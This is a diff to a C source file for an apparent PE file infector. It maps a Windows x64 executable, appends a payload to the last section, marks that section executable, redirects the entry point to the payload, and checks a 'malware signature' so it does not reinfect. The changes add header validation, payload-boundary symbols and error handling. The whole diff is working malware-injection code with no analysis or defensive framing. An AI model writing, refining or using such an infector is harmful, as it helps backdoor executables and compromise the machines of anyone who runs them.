@@ -5,22 +5,37 @@
 #include "utils.h"
 
 EXTERN_C_START
+extern CONST BYTE __payload_start;
+extern CONST DWORD signature;
 extern CONST VOID payload();
 extern LONGLONG delta_start;
 extern LONGLONG to_c_code;
-extern CONST DWORD signature;
 extern DWORD code_size;
+extern CONST BYTE __payload_end;
 EXTERN_C_END
 
-VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
-                   IN CONST DWORD dwPayloadSize) {
+BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
+                   IN CONST PCVOID pEntryPoint, IN CONST DWORD dwPayloadSize) {
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     WORD wNbSections;
     DWORD dwFileAlignment, dwSectionAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr,
         dwOrigEntryPoint, dwNewEntryPoint, dwSignature, dwSizeAligned;
+    printf("pDosHeader: %p\n", pDosHeader);
+
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        printf("[!] Invalid DOS signature\n");
+        return FALSE;
+    }
 
     pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
+    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
+        pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
+        pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        printf("[!] Not a PE x64 file\n");
+        return FALSE;
+    }
+
     wNbSections = pNtHeader->FileHeader.NumberOfSections;
     pSection = IMAGE_FIRST_SECTION(pNtHeader);
     dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
@@ -42,15 +57,20 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     printf("Old size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
     printf("Old size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
-    dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
-                             ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
-    printf("\nMalware signature: %#010lx\n\n", dwSignature);
-
-    if (dwSignature == signature) {
-        printf("Payload already injected!\n");
-        return;
+    if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
+        dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
+        dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
+                                 (dwOrigEntryPoint - pLastSection->VirtualAddress) -
+                                 ((PCBYTE)pEntryPoint - (PCBYTE)&signature));
+        printf("\nEntry point seems suspicious (inside last section)\n");
+        printf("Malware signature: %#010lx\n", dwSignature);
+        if (dwSignature == signature) {
+            printf("Payload already injected!\n");
+            return FALSE;
+        }
     }
 
+#pragma warning(suppress : 4146)
     dwSizeAligned = PG_ALIGN_UP(dwPayloadSize, dwFileAlignment);
     printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
     pLastSection->Misc.VirtualSize = pLastSection->SizeOfRawData + dwPayloadSize;
@@ -58,6 +78,7 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                 ? dwSizeAligned
                                                 : pLastSection->SizeOfRawData;
+#pragma warning(suppress : 4146)
     pNtHeader->OptionalHeader.SizeOfImage = PG_ALIGN_UP(
         pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
     pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
@@ -69,7 +90,8 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     printf("New size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
     printf("New size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
-    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize;
+    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize +
+                      (LONG)((PCBYTE)pEntryPoint - (PCBYTE)pPayload);
     pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
     printf("New entry point: %#010lx\n", dwNewEntryPoint);
 
@@ -83,6 +105,8 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     HexDump(pPayload, dwPayloadSize);
 
     memcpy((PBYTE)pDosHeader + dwPayloadPtr, pPayload, dwPayloadSize);
+
+    return TRUE;
 }
 
 int main(int argc, char* argv[]) {
@@ -91,11 +115,12 @@ int main(int argc, char* argv[]) {
     LPVOID pMapAddress;
     DWORD dwFileSize, dwPayloadSize;
     ULARGE_INTEGER uliSize, uliOffset;
+    BOOL bInjected;
 
-    dwPayloadSize = (DWORD)((PCBYTE)&code_size - (PCBYTE)&payload + sizeof(code_size));
+    dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
     printf("Payload size: %lu\n", dwPayloadSize);
-    printf("Payload: %p\n", &payload);
-    // HexDump((PCBYTE)&payload, dwPayloadSize);
+    printf("Payload: %p\n", &__payload_start);
+    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);
 
     if (argc < 2) {
         fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
@@ -115,6 +140,7 @@ int main(int argc, char* argv[]) {
 
     dwFileSize = GetFileSize(hFile, NULL);
     printf("File size: %lu bytes\n", dwFileSize);
+#pragma warning(suppress : 4146)
     DWQUAD(uliSize) = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(dwPayloadSize, 512), 512);
 
     hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
@@ -142,10 +168,17 @@ int main(int argc, char* argv[]) {
     VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);
 
     printf("[*] Injecting payload...\n");
-    InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PCBYTE)&payload, dwPayloadSize);
+    bInjected = InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PCBYTE)&__payload_start, &payload,
+                              dwPayloadSize);
+    if (!bInjected) {
+        ret = 1;
+        printf("[!] Injection failed!\n");
+        goto unmap;
+    }
     printf("[*] Injection complete!\n");
 
     FlushViewOfFile(pMapAddress, 0);
+unmap:
     UnmapViewOfFile(pMapAddress);
     FlushFileBuffers(hFile);
 close_map:
